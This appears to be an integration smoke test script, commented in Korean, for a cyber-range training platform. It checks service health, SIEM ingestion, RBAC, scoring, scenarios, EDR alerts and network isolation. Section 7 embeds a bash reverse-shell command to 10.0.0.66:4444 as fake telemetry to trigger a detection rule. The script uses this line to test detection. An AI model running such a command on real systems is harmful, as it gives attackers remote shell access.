#!/usr/bin/env bash
# =============================================================================
# Cyber Range Platform — 전체 통합 스모크 테스트
# =============================================================================
# 실행 중인 docker 스택(M0~M6)의 서비스 간 E2E 경로를 실제로 두드려 검증한다.
# 각 검사는 실제 응답값을 근거로 PASS/FAIL을 판정하며, 하나라도 실패하면 exit 1.
#
# 사용법:  bash scripts/smoke_test.sh
# 전제:    docker compose up -d 로 11개 컨테이너가 떠 있어야 함
# =============================================================================
set -u

PASS=0; FAIL=0
RUN_ID="smoke-$(date +%s)-$$"

c()  { curl -s -m 8 "$@"; }                       # 짧은 타임아웃 curl
jq() { python3 -c "import sys,json;d=json.load(sys.stdin);print($1)" 2>/dev/null; }

ok()   { echo "  ✅ PASS  $1"; PASS=$((PASS+1)); }
bad()  { echo "  ❌ FAIL  $1"; FAIL=$((FAIL+1)); }
sect() { echo; echo "── $1 ────────────────────────────────────────────"; }

echo "=================================================================="
echo " Cyber Range 통합 스모크 테스트   run_id=$RUN_ID"
echo " $(date -Iseconds)"
echo "=================================================================="

# EDR 호스트 포트 자동 감지: 로컬은 docker-compose.override.yml로 18080 리맵,
# CI/기본 환경은 override 없이 8080. /health가 뜨는 쪽을 채택(환경변수 EDR_PORT로 강제 가능).
EDR_PORT="${EDR_PORT:-}"
if [ -z "$EDR_PORT" ]; then
  for p in 18090 18080 8080; do
    if [ "$(c -o /dev/null -w '%{http_code}' http://localhost:$p/health)" = "200" ]; then EDR_PORT=$p; break; fi
  done
  EDR_PORT="${EDR_PORT:-18090}"
fi
EDR="http://localhost:$EDR_PORT"

# -----------------------------------------------------------------------------
sect "1. 헬스체크 (12개 서비스)"
declare -A SVC=(
  [8010]=event_collector [8020]=scoring_engine [8030]=config_service
  [$EDR_PORT]=edr_backend [8040]=siem_api       [8045]=scenario_engine
  [8050]=instructor_api  [8090]=aar_report     [8070]=noc_monitor
  [8001]=ground_station  [8002]=power_plant    [8003]=defense_network
)
for port in 8010 8020 8030 $EDR_PORT 8040 8045 8050 8090 8070 8001 8002 8003; do
  body=$(c "http://localhost:$port/health")
  status=$(echo "$body" | jq "d.get('status')")
  if [ "$status" = "ok" ]; then ok "${SVC[$port]} (:$port) status=ok"
  else bad "${SVC[$port]} (:$port) -> '$body'"; fi
done

# -----------------------------------------------------------------------------
sect "2. 트윈 텔레메트리 + 공격표면 (ground_station)"
tele=$(c "http://localhost:8001/api/telemetry")
if echo "$tele" | grep -q "."; then
  keys=$(echo "$tele" | jq "list(d.keys())[:4]")
  ok "GS 텔레메트리 응답 keys=$keys"
else bad "GS 텔레메트리 무응답"; fi
# 취약 로그인 시도 -> 트윈이 access log를 shared 볼륨에 기록(SIEM이 tail)
login=$(c -o /dev/null -w "%{http_code}" -X POST "http://localhost:8001/api/login" \
        -H 'Content-Type: application/json' -d '{"username":"admin","password":"wrong-'"$RUN_ID"'"}')
if [ -n "$login" ] && [ "$login" != "000" ]; then ok "GS /api/login 응답 코드=$login (access log 생성)"
else bad "GS /api/login 무응답"; fi

# -----------------------------------------------------------------------------
sect "3. SIEM 인제스천 (트윈 → SIEM 파이프라인)"
siem_total() { c "http://localhost:8040/stats" | jq "sum(int(v) for v in d.get('events_by_source',{}).values())"; }
stats_before=$(siem_total); stats_before=${stats_before:-0}
# 트윈 여러 자산에 트래픽을 발생시켜 access log 라인 유도
for i in 1 2 3; do
  c -o /dev/null -X POST "http://localhost:8001/api/login" -H 'Content-Type: application/json' \
     -d '{"username":"u'"$i"'","password":"bad-'"$RUN_ID"'"}'
  c -o /dev/null "http://localhost:8002/api/telemetry"
  c -o /dev/null "http://localhost:8003/api/telemetry"
done
# 파일 tailer 폴링 주기 대기
sleep 6
stats_after=$(siem_total); stats_after=${stats_after:-0}
if [ "$stats_after" -gt "$stats_before" ]; then
  ok "SIEM 인제스트 이벤트 $stats_before -> $stats_after (+$((stats_after-stats_before)))"
else
  bad "SIEM 이벤트 증가 없음 (before=$stats_before after=$stats_after)"
fi
srch=$(c "http://localhost:8040/sources/health")
if echo "$srch" | grep -qi "twin"; then ok "SIEM sources/health twin 소스 인식됨"
else bad "SIEM sources/health twin 소스 없음 -> $srch"; fi

# -----------------------------------------------------------------------------
sect "4. Config Service (교관 조작 + audit)"
# 교관 토큰은 실제로 강제된다(보안 정상). 로컬 스모크는 실행 중 컨테이너에서 토큰을 읽어 사용.
ITOKEN=$(docker exec config_service printenv INSTRUCTOR_TOKEN 2>/dev/null)
if [ -n "$ITOKEN" ]; then ok "INSTRUCTOR_TOKEN 강제됨(인증 활성) — 토큰 획득"
else echo "  ℹ️  INSTRUCTOR_TOKEN 미설정(개발 모드) — 미인증 통과 경로"; fi
AUTH=(-H "Authorization: Bearer $ITOKEN")
vid="SMOKE-VULN-$RUN_ID"
# 인증 없이 호출 시 401이어야 함(음성 테스트)
noauth=$(c -o /dev/null -w "%{http_code}" -X POST "http://localhost:8030/instructor/patch/toggle" \
      -H 'Content-Type: application/json' \
      -d '{"asset":"ground_station","vuln_id":"x","patched":true,"reason":"x"}')
if [ -z "$ITOKEN" ] || [ "$noauth" = "401" ]; then ok "미인증 요청 차단됨 (HTTP $noauth)"
else bad "미인증 요청이 차단되지 않음 (HTTP $noauth)"; fi
tog=$(c -X POST "http://localhost:8030/instructor/patch/toggle" "${AUTH[@]}" \
      -H 'Content-Type: application/json' \
      -d '{"asset":"ground_station","vuln_id":"'"$vid"'","patched":true,"reason":"smoke '"$RUN_ID"'"}')
patched=$(echo "$tog" | jq "d.get('patched')")
if [ "$patched" = "True" ]; then ok "패치 토글 성공 vuln_id=$vid patched=True"
else bad "패치 토글 실패 -> $tog"; fi
rb=$(c "http://localhost:8030/config/patches?asset=ground_station" | jq "d.get('$vid')")
if [ "$rb" = "True" ]; then ok "패치 상태 read-back 일치 (트윈 폴링 경로)"
else bad "패치 read-back 불일치 -> $rb"; fi
aud=$(c "http://localhost:8030/instructor/audit?action=patch_toggle" | grep -c "$RUN_ID")
if [ "${aud:-0}" -ge 1 ]; then ok "audit log에 patch_toggle 기록됨 ($aud건)"
else bad "audit log 기록 없음"; fi
# RBAC 역할 구분(P3): blue 토큰은 instructor 전용 엔드포인트에서 403이어야 함.
BTOK=$(docker exec config_service printenv BLUE_TOKEN 2>/dev/null)
if [ -n "$BTOK" ]; then
  rc=$(c -o /dev/null -w "%{http_code}" -X POST "http://localhost:8030/instructor/patch/toggle" \
       -H "Authorization: Bearer $BTOK" -H 'Content-Type: application/json' \
       -d '{"asset":"ground_station","vuln_id":"x","patched":true,"reason":"x"}')
  if [ "$rc" = "403" ]; then ok "RBAC 역할 구분: blue 토큰 instructor 엔드포인트 거부 (HTTP 403)"
  else bad "RBAC 역할 구분 실패: blue 토큰이 instructor 엔드포인트에서 HTTP $rc (기대 403)"; fi
else echo "  ℹ️  BLUE_TOKEN 미설정 — RBAC 역할 구분 검사 스킵"; fi

# -----------------------------------------------------------------------------
sect "5. 이벤트 채점 파이프라인 (event_collector → scoring_engine)"
team="smoke_team_$$"
eid="evt-$RUN_ID"
scn="SAT-KILLCHAIN-01"
# /scores?scenario_id=... -> {"teams":{team:{"red":N,"blue":N}}}
team_red() { c "http://localhost:8020/scores?scenario_id=$scn" | jq "int(d.get('teams',{}).get('$team',{}).get('red',0))"; }
before=$(team_red); before=${before:-0}
# red_objective_success = +100 (RED_POINTS['objective'])
c -X POST "http://localhost:8010/events" -H 'Content-Type: application/json' -d '{
  "event_id":"'"$eid"'","event_type":"red_objective_success","actor":"red",
  "team_id":"'"$team"'","scenario_id":"'"$scn"'","target_asset":"ground_station",
  "phase":"objective","metadata":{"smoke":"'"$RUN_ID"'"}}' >/dev/null
sleep 2
seen=$(c "http://localhost:8010/events" | grep -c "$eid")
if [ "${seen:-0}" -ge 1 ]; then ok "event_collector 저장 확인 event_id=$eid"
else bad "event_collector에서 이벤트 조회 실패"; fi
after=$(team_red); after=${after:-0}
if [ "$after" -gt "$before" ]; then ok "scoring_engine 점수 반영 $before -> $after (red_objective +$((after-before)))"
else bad "점수 미반영 (before=$before after=$after) — 자동 forwarding 확인 필요"; fi

# -----------------------------------------------------------------------------
sect "6. 시나리오 엔진 (activate → progress → deactivate)"
act=$(c -X POST "http://localhost:8050/instructor/scenario/start" -H 'Content-Type: application/json' \
      -d '{"scenario_id":"SAT-KILLCHAIN-01","team_ids":["'"$team"'"],"reason":"smoke '"$RUN_ID"'"}')
if echo "$act" | grep -qi "activat\|scenario\|ok\|SAT-KILLCHAIN"; then ok "instructor_api → scenario activate 성공"
else bad "시나리오 activate 실패 -> $act"; fi
prog=$(c "http://localhost:8045/scenario/SAT-KILLCHAIN-01/progress")
if echo "$prog" | grep -qi "stage\|progress\|scenario\|status"; then
  ok "scenario progress 조회 OK"
else bad "scenario progress 조회 실패 -> $prog"; fi
dea=$(c -X POST "http://localhost:8050/instructor/scenario/end" -H 'Content-Type: application/json' \
      -d '{"scenario_id":"SAT-KILLCHAIN-01","reason":"smoke end '"$RUN_ID"'"}')
if echo "$dea" | grep -qi "deactiv\|scenario\|ok\|end"; then ok "instructor_api → scenario deactivate 성공"
else bad "시나리오 deactivate 실패 -> $dea"; fi

# -----------------------------------------------------------------------------
sect "7. EDR (텔레메트리 인제스트 → 탐지 EDR-002)  [port $EDR_PORT]"
c -X POST "$EDR/edr/ingest" -H 'Content-Type: application/json' -d '{
  "asset":"ground_station","timestamp":'"$(date +%s)"',"server_pid":1,
  "processes":[
    {"pid":40001,"ppid":1000,"name":"bash","cmdline":"bash -i >& /dev/tcp/10.0.0.66/4444 0>&1","create_time":'"$(date +%s)"',"username":"www-data","connections":[]}
  ]}' >/dev/null
hosts=$(c "$EDR/edr/hosts" | grep -c "ground_station")
if [ "${hosts:-0}" -ge 1 ]; then ok "EDR 호스트 인벤토리에 ground_station 등록"
else bad "EDR 호스트 미등록 -> $(c $EDR/edr/hosts)"; fi
sleep 1
al=$(c "$EDR/edr/alerts" | grep -c "EDR-002")
if [ "${al:-0}" -ge 1 ]; then ok "EDR-002 리버스쉘 탐지 알림 생성됨 ($al건)"
else bad "EDR-002 탐지 실패 -> $(c $EDR/edr/alerts | head -c 300)"; fi

# -----------------------------------------------------------------------------
# 복구 판정 E2E (noc_monitor RecoveryWatcher). 트윈을 실제로 down/up 하므로 ~35초 소요 →
# 기본 스킵. 전체 검증 시 SMOKE_RECOVERY=1 bash scripts/smoke_test.sh 로 실행.
if [ "${SMOKE_RECOVERY:-0}" = "1" ]; then
  sect "8b. 복구 판정 E2E (asset_compromised → 패치 → 트윈복구 → asset_recovered → MTTR)"
  rteam="recov_$$"; rvuln="PP-001"; rscn="SCADA-SABOTAGE-01"; rasset="power_plant"
  c -X POST "http://localhost:8010/events" -H 'Content-Type: application/json' -d '{
    "event_id":"cmp-'"$RUN_ID"'","event_type":"asset_compromised","actor":"red",
    "team_id":"'"$rteam"'","scenario_id":"'"$rscn"'","target_asset":"'"$rasset"'","vuln_id":"'"$rvuln"'","metadata":{}}' >/dev/null
  sleep 2
  c -X POST "http://localhost:8030/instructor/patch/toggle" "${AUTH[@]}" -H 'Content-Type: application/json' \
    -d '{"asset":"'"$rasset"'","vuln_id":"'"$rvuln"'","patched":true,"reason":"smoke recovery"}' >/dev/null
  docker stop pp_twin >/dev/null 2>&1; sleep 8
  docker start pp_twin >/dev/null 2>&1; sleep 22
  rec=$(c "http://localhost:8010/replay/events?scenario_id=$rscn" | python3 -c "
import sys,json
evs=json.load(sys.stdin).get('events',[])
print(sum(1 for e in evs if e.get('event_type')=='asset_recovered' and e.get('team_id')=='$rteam'))" 2>/dev/null)
  if [ "${rec:-0}" -ge 1 ]; then ok "asset_recovered 발행됨 (침해→패치→복구 조건 충족)"
  else bad "asset_recovered 미발행 (복구 조건 판정 실패)"; fi
  rblue=$(c "http://localhost:8020/scores?scenario_id=$rscn" | jq "int(d.get('teams',{}).get('$rteam',{}).get('blue',0))")
  if [ "${rblue:-0}" -ge 50 ]; then ok "scoring blue +$rblue ($rscn 버킷에 정확히 귀속)"
  else bad "복구 점수 미반영 (blue=$rblue)"; fi
  mttr=$(c "http://localhost:8090/report/aar?scenario_id=$rscn" | jq "d.get('blue_performance',{}).get('mttr_sec')")
  if [ -n "$mttr" ] && [ "$mttr" != "None" ]; then ok "AAR MTTR 산출됨 (mttr_sec=$mttr)"
  else bad "AAR MTTR=null (복구 이벤트 상관 실패)"; fi
else
  echo; echo "── 8b. 복구 판정 E2E ─ 스킵 (SMOKE_RECOVERY=1 로 활성화) ──"
fi

# -----------------------------------------------------------------------------
sect "8. AAR 리포트 (집계 + PDF)"
aar=$(c "http://localhost:8090/report/aar")
mttd=$(echo "$aar" | jq "d.get('blue_performance',{}).get('mttd_sec')")
drate=$(echo "$aar" | jq "round(float(d.get('blue_performance',{}).get('detection_rate',0))*100,1)")
if echo "$aar" | grep -qi "blue_performance\|attack_heatmap\|recommend"; then
  ok "AAR /report/aar 집계 응답 (mttd=${mttd}s detection_rate=${drate}%)"
else bad "AAR 집계 실패 -> $(echo "$aar" | head -c 200)"; fi
magic=$(c "http://localhost:8090/report/aar/pdf" | head -c 5)
if echo "$magic" | grep -q "%PDF"; then ok "AAR PDF 렌더링 OK (magic=$magic)"
else bad "AAR PDF 헤더 불일치 (got='$magic')"; fi

# -----------------------------------------------------------------------------
sect "9. 트윈 네트워크 격리 (로드맵 F ★★★)"
# docker exec 가능한 환경에서만(트윈 컨테이너 내부에서 실측). 없으면 스킵.
if docker ps --format '{{.Names}}' 2>/dev/null | grep -q '^gs_twin$'; then
  # (c) 직접 lateral: gs_twin이 sibling 트윈 이름조차 해석 못 해야 함
  lat=$(docker exec gs_twin python3 -c "
import socket
s=socket.socket();s.settimeout(4)
try: s.connect(('pp_twin',8002));print('OPEN')
except Exception: print('BLOCKED')
finally: s.close()" 2>/dev/null | tail -1)
  [ "$lat" = "BLOCKED" ] && ok "직접 lateral 차단 (gs_twin ↛ pp_twin)" || bad "직접 lateral 열림 ($lat)"
  # (c2) 간접 lateral: sibling 게이트웨이 경유도 차단돼야 함
  ilat=$(docker exec gs_twin python3 -c "
import urllib.request
try: urllib.request.urlopen('http://pp_gateway:8002/health',timeout=4);print('OPEN')
except Exception: print('BLOCKED')" 2>/dev/null | tail -1)
  [ "$ilat" = "BLOCKED" ] && ok "간접 lateral 차단 (gs_twin ↛ pp_gateway → pp_twin)" || bad "간접 lateral 열림 ($ilat)"
  # (d) egress: 외부 인터넷 도달 불가
  eg=$(docker exec gs_twin python3 -c "
import socket
s=socket.socket();s.settimeout(5)
try: s.connect(('8.8.8.8',53));print('OPEN')
except Exception: print('BLOCKED')
finally: s.close()" 2>/dev/null | tail -1)
  [ "$eg" = "BLOCKED" ] && ok "인터넷 egress 차단 (gs_twin ↛ 8.8.8.8:53)" || bad "egress 열림 ($eg) — 익스플로잇 유출 위험"
  # (b) 트윈→코어 통신은 유지돼야 함(격리가 정상 기능을 깨지 않았는지)
  core=$(docker exec gs_twin python3 -c "
import urllib.request
try: urllib.request.urlopen('http://event_collector:8010/health',timeout=4);print('OK')
except Exception: print('FAIL')" 2>/dev/null | tail -1)
  [ "$core" = "OK" ] && ok "트윈 → 코어 통신 유지 (gs_twin → event_collector)" || bad "트윈→코어 통신 끊김 ($core)"
else
  echo "  ℹ️  gs_twin 컨테이너 없음 — 격리 검증 스킵"
fi

# -----------------------------------------------------------------------------
echo
echo "=================================================================="
echo " 결과:  PASS=$PASS   FAIL=$FAIL   (총 $((PASS+FAIL)))"
echo "=================================================================="
if [ "$FAIL" -eq 0 ]; then echo " 🎉 전체 통합 스모크 테스트 통과"; exit 0
else echo " ⚠️  실패한 검사가 있습니다 — 위 ❌ 항목 확인"; exit 1; fi
